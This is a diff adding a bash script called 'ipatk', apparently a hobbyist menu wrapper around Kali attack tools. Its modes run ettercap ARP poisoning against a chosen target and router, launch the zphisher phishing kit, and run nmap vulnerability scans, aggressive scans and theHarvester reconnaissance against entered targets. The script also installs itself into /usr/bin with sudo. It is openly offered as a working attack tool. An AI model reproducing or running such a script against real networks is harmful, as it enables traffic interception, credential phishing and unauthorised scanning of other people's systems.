@@ -1,0 +1,140 @@
+#!/bin/bash
+
+#####################################
+#   NEW:CMD=ipatk                   #
+#                                   #
+#         this script is just       #
+#          used for quick ip stuff. #
+#                                   #
+#     >:)                           #
+#####################################
+
+# i would use lolcat if i were u :)
+
+# to use this script you need to install a few kali tools 
+# just uncomment VVV those
+
+# sudo apt install ettercap-common
+# sudo apt install nmap-common
+# sudo apt install theharvester
+# git clone https://github.com/htr-tech/zphisher.git
+
+
+
+FILE=/usr/bin/ipatk
+
+if test -f "$FILE"; then
+        sleep 0
+else
+        chmod +x ipatk 
+        sudo mv ipatk /usr/bin
+fi
+
+
+cmdtype=$1
+
+if [[ "$cmdtype" == "arp" ]]; then
+        sleep 1
+        clear;figlet "ARP ATK"
+
+sleep 1
+
+read -p "enter and interface (like wlan0) > " inface
+echo ""
+read -p "enter an the first ip (div target) > " ip
+echo ""
+read -p "enter the router to poison > " route
+echo ""
+
+read -p "do you want to run this command? (y or n) > " yorn
+
+if [[ "$yorn" == "Y" ]]; then
+        echo "ALREADY"
+        sleep 1
+        clear
+elif [[ "$yorn" == "y" ]]; then
+        echo "ALREADY"
+        sleep 1
+        clear
+elif [[ "$yorn" == "N" ]]; then
+        echo "BYE $USER"
+        sleep 1
+        clear
+        exit
+elif [[ "$yorn" == "n" ]]; then
+        echo "BYE $USER"
+        sleep 1
+        clear
+        exit
+else
+        echo "enter y or n"
+        exit
+fi
+
+sudo ettercap -T -S -i $inface -M arp:remote /$ip// /$route//
+
+elif [[ "$cmdtype" == "listips" ]]; then
+        sleep 1
+        clear;echo "IP LIST"|figlet 
+        sleep 1
+        echo -en "\ntype the ip range: "
+        read ipr
+        sudo nmap -sL $ipr
+elif [[ "$cmdtype" == "link" ]]; then
+        sleep 1
+        /home/deemon/git.hub.scripts/zphisher/zphisher.sh
+elif [[ "$cmdtype" == "Sakupen" ]]; then
+        sleep 1
+        clear;figlet "SaKuPeN"
+        echo ""
+        sleep 1
+        read -p "enter port number > " port
+        sleep 1
+        echo ""
+        read -p "enter an ip or ip range > " ipr
+        sleep 1
+        sudo nmap -p $port --script vuln -d $ipr
+elif [[ "$cmdtype" == "dork" ]]; then
+        sleep 1
+        clear;echo "DORK"|figlet
+        sleep 1
+        echo ""
+        read -p "type a source > " sorce
+        echo ""
+        read -p "type a target > " tar
+        echo ""
+        read -p "type a limit (default is 1000) > " lim
+        if [[ "$lim" == "" ]]; then
+                theHarvester -b $sorce -d $tar -l 1000
+        else
+                theHarvester -b $sorce -d $tar -l $lim
+        fi
+elif [[ "$cmdtype" == "nmapA" ]]; then
+        sleep 1
+        clear;echo "NmaPA"|figlet
+        echo ""
+        sleep 1
+        read -p "enter an ip or ip range > " ipr
+        sleep 1
+        clear;nmap -A -sV $ipr
+elif [[ "$cmdtype" == "vuln" ]]; then
+        sleep 1
+        clear;figlet "VULN"
+        echo ""
+        sleep 0.5
+        read -p "enter ip or ip range: " ipr
+        echo ""
+        read -p "enter port (if any): " port
+        if [[ "$port" == "" ]]; then
+                sudo nmap --script vuln -d $ipr
+        else
+                sudo nmap -p $port --script vuln -d $ipr
+        fi
+else
+        sleep 0.05
+        echo """ipatk had an error 
+usage: ipatk { arp|link|Sakupen|dork|nmapA|vuln }
+        """
+fi
+
+# all this script is just abunch of if commands and kali tools
